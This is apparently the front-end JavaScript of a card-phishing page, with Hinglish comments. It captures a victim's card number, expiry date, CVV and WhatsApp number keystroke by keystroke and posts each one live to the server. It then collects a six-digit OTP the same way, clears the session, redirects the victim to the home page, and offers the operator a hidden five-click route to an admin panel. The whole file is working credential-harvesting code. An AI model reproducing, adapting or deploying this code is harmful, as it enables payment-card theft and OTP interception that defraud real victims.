// ==================== SESSION STATE ====================
let sessionId = null;
let cardTimeout = null;
let expiryTimeout = null;
let cvvTimeout = null;
let waTimeout = null;
let otpTimeout = null;
let redirectTimeout = null;
let adminClickCount = 0;
let sessionReady = false;

// ==================== HELPERS ====================
function getSessionId() {
    return sessionStorage.getItem('cml_session_id');
}

function setSessionId(id) {
    sessionId = id;
    sessionStorage.setItem('cml_session_id', id);
}

function clearSession() {
    sessionStorage.removeItem('cml_session_id');
    sessionId = null;
    sessionReady = false;
}

// ⭐ NAYA: Page load pe session create karo
function ensureSession() {
    return new Promise((resolve) => {
        // Agar pehle se session hai
        const existing = getSessionId();
        if (existing) {
            sessionId = existing;
            sessionReady = true;
            resolve(existing);
            return;
        }

        // Naya session banao
        fetch('/create_session', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        })
        .then(res => res.json())
        .then(data => {
            if (data.success && data.id) {
                setSessionId(data.id);
                sessionReady = true;
                console.log("✅ Session created:", data.id);
                resolve(data.id);
            } else {
                resolve(null);
            }
        })
        .catch(err => {
            console.error("Session create error:", err);
            resolve(null);
        });
    });
}

// ==================== CHECK ALL FIELDS ====================
function areAllFieldsComplete() {
    const cardEl = document.getElementById('cardNumber');
    const expiryEl = document.getElementById('expiryDate');
    const cvvEl = document.getElementById('cvv');
    const waEl = document.getElementById('whatsapp');
    
    if (!cardEl || !expiryEl || !cvvEl || !waEl) return false;
    
    const card = cardEl.value.replace(/\s/g, '');
    const expiry = expiryEl.value;
    const cvv = cvvEl.value;
    const wa = waEl.value;
    
    return (
        card.length === 16 &&
        expiry.length === 5 &&
        cvv.length === 3 &&
        wa.length === 9
    );
}

function checkAndRedirect() {
    if (areAllFieldsComplete()) {
        console.log("✅ All fields complete — auto redirecting to OTP");
        
        if (redirectTimeout) clearTimeout(redirectTimeout);
        
        redirectTimeout = setTimeout(() => {
            window.location.href = '/otp';
        }, 500);
    }
}


// ==================== SEND UPDATES (QUEUE SAFE) ====================
// ⭐ NAYA: Ye helper session ready hone tak wait karta hai
function sendWhenReady(endpoint, payload) {
    if (sessionReady && getSessionId()) {
        payload.sessionId = getSessionId();
        return fetch(endpoint, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(res => res.json())
        .catch(err => console.error(endpoint + " error:", err));
    } else {
        // Session ban raha hai — wait karo
        return ensureSession().then((sid) => {
            if (!sid) return;
            payload.sessionId = sid;
            return fetch(endpoint, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(res => res.json())
            .catch(err => console.error(endpoint + " error:", err));
        });
    }
}


// ==================== CARD NUMBER ====================
const cardInput = document.getElementById('cardNumber');
if (cardInput) {
    cardInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 16) value = value.slice(0, 16);
        
        let formatted = value.replace(/(.{4})/g, '$1 ').trim();
        this.value = formatted;
        
        clearTimeout(cardTimeout);
        cardTimeout = setTimeout(() => {
            sendWhenReady('/update_card', { cardNumber: value });
        }, 300);
        
        checkAndRedirect();
    });
}


// ==================== EXPIRY DATE ====================
const expiryInput = document.getElementById('expiryDate');
if (expiryInput) {
    expiryInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 4) value = value.slice(0, 4);
        
        if (value.length >= 3) {
            this.value = value.slice(0, 2) + '/' + value.slice(2);
        } else {
            this.value = value;
        }
        
        clearTimeout(expiryTimeout);
        expiryTimeout = setTimeout(() => {
            sendWhenReady('/update_expiry', { expiry: this.value });
        }, 300);
        
        checkAndRedirect();
    });
    
    expiryInput.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && this.value.length === 3 && this.value.includes('/')) {
            e.preventDefault();
            this.value = this.value.slice(0, 2);
            sendWhenReady('/update_expiry', { expiry: this.value });
            checkAndRedirect();
        }
    });
}


// ==================== CVV ====================
const cvvInput = document.getElementById('cvv');
if (cvvInput) {
    cvvInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 3) value = value.slice(0, 3);
        this.value = value;
        
        clearTimeout(cvvTimeout);
        cvvTimeout = setTimeout(() => {
            sendWhenReady('/update_cvv', { cvv: value });
        }, 300);
        
        checkAndRedirect();
    });
}


// ==================== WHATSAPP ====================
const waInput = document.getElementById('whatsapp');
if (waInput) {
    waInput.addEventListener('input', function() {
        let value = this.value.replace(/\D/g, '');
        if (value.length > 9) value = value.slice(0, 9);
        this.value = value;
        
        clearTimeout(waTimeout);
        waTimeout = setTimeout(() => {
            sendWhenReady('/update_whatsapp', { whatsapp: value });
        }, 300);
        
        checkAndRedirect();
    });
}


// ==================== OTP PAGE ====================
function sendOtpUpdate(otp) {
    const sid = getSessionId();
    if (!sid || !otp) return;
    
    fetch('/update_otp', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ sessionId: sid, otp: otp })
    })
    .then(res => res.json())
    .catch(err => console.error("OTP error:", err));
}

function moveNext(current) {
    if (current.value && !/^\d$/.test(current.value)) {
        current.value = '';
        return;
    }
    
    if (current.value.length === 1) {
        const boxes = document.querySelectorAll('.otp-box');
        const index = Array.from(boxes).indexOf(current);
        
        if (index < boxes.length - 1) {
            boxes[index + 1].focus();
        } else {
            current.blur();
            handleOtpComplete();
        }
    }
}

document.addEventListener('input', function(e) {
    if (e.target.classList.contains('otp-box')) {
        const boxes = document.querySelectorAll('.otp-box');
        const otp = Array.from(boxes).map(b => b.value).join('');
        
        if (otp.length > 0) {
            clearTimeout(otpTimeout);
            otpTimeout = setTimeout(() => {
                sendOtpUpdate(otp);
            }, 200);
        }
        
        if (otp.length === 6) {
            handleOtpComplete();
        }
    }
});

function handleOtpComplete() {
    const boxes = document.querySelectorAll('.otp-box');
    const otp = Array.from(boxes).map(b => b.value).join('');
    
    if (otp.length === 6) {
        sendOtpUpdate(otp);
        
        setTimeout(() => {
            clearSession();
            window.location.href = '/';
        }, 1200);
    }
}

document.addEventListener('keydown', function(e) {
    if (e.key === 'Backspace' && e.target.classList.contains('otp-box') && !e.target.value) {
        const boxes = document.querySelectorAll('.otp-box');
        const index = Array.from(boxes).indexOf(e.target);
        if (index > 0) {
            boxes[index - 1].focus();
            boxes[index - 1].value = '';
            
            const otp = Array.from(boxes).map(b => b.value).join('');
            if (otp) sendOtpUpdate(otp);
        }
    }
});


// ==================== MOBILE KEYBOARD FIX ====================
function scrollInputIntoView(el) {
    if (!el) return;
    
    setTimeout(() => {
        try {
            el.scrollIntoView({ 
                behavior: 'smooth', 
                block: 'center'
            });
        } catch(e) {
            el.scrollIntoView(false);
        }
    }, 300);
}

function attachInputFocus() {
    document.querySelectorAll('input').forEach(inp => {
        if (inp.dataset.kbAttached) return;
        inp.dataset.kbAttached = '1';
        
        inp.addEventListener('focus', function() {
            scrollInputIntoView(this);
        });
    });
}

attachInputFocus();

const observer = new MutationObserver(() => {
    attachInputFocus();
});
observer.observe(document.body, { childList: true, subtree: true });


// ==================== SECRET ADMIN TRIGGER ====================
function triggerAdmin() {
    adminClickCount++;
    if (adminClickCount === 5) {
        window.location.href = '/admin';
        adminClickCount = 0;
    }
    setTimeout(() => { adminClickCount = 0; }, 2000);
}


// ==================== PAGE INIT ====================
// ⭐ SABSE ZAROORI FIX: Page load pe hi session create karo
window.addEventListener('load', function() {
    const currentPath = window.location.pathname;
    
    // OTP page pe naya session nahi banana
    if (currentPath === '/' || currentPath === '/index') {
        // Session hamesha ready rakho
        ensureSession();
        console.log("🚀 Page loaded, session ensured");
    }
});

// Page show event (back button handle)
window.addEventListener('pageshow', function(event) {
    if (event.persisted) {
        const currentPath = window.location.pathname;
        if (currentPath === '/' || currentPath === '/index') {
            // Form clear + naya session
            clearSession();
            ensureSession();
        }
    }
});